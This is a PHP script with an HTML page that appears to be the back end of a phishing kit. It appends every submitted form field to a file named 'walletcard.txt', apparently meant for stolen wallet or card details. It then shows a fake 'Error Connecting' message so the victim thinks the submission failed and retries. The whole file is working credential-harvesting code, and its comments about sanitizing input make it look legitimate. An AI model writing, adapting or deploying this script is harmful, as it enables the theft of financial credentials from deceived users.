<?php
// Open or create a file for writing form data
$handle = fopen("walletcard.txt", "a");

// Iterate through POST data
foreach ($_POST as $variable => $value) {
    // Sanitize form input to prevent any injection attacks
    $safe_variable = htmlspecialchars($variable, ENT_QUOTES, 'UTF-8');
    $safe_value = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
    
    // Write sanitized data to the file
    fwrite($handle, $safe_variable);
    fwrite($handle, "=");
    fwrite($handle, $safe_value);
    fwrite($handle, "<br>");
}

fwrite($handle, "<hr>");
fclose($handle);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connection Status</title>
    <style>
        /* Center the page content */
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #fff4f4; /* Light red background for error */
            margin: 0;
            font-family: Arial, sans-serif;
        }
        
        /* Error popup styling */
        .popup {
            text-align: center;
            padding: 30px;
            border-radius: 12px;
            background-color: #e63946; /* Dark red background */
            color: white;
            font-size: 20px;
            font-weight: bold;
            box-shadow: 0px 8px 12px rgba(0, 0, 0, 0.15);
            max-width: 300px;
        }

        .popup p {
            margin: 10px 0 0;
            font-size: 16px;
            opacity: 0.8;
        }

        /* Additional design elements */
        .popup::before {
            content: "⚠️";
            font-size: 40px;
            display: block;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="popup">
        Error Connecting
        <p>Please check your connection and try again.</p>
    </div>
</body>
</html>
